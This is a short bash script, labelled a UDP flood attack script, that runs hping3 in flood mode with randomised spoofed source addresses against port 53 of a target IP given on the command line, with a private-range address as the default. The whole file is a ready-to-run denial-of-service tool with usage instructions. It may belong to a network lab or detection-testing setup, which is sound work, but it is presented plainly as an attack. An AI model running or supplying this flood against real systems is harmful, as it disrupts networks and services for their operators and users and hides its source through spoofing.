#!/bin/bash
# UDP Flood Attack Script
# Uses hping3 to generate UDP flood traffic
#
# Usage: sudo bash attack/udp_flood.sh <target_ip>

TARGET_IP=${1:-"10.0.2.1"}

echo "=== UDP Flood Attack ==="
echo "Target: $TARGET_IP"
echo "Press Ctrl+C to stop"
echo "========================"

sudo hping3 --udp --flood -V -p 53 --rand-source $TARGET_IP
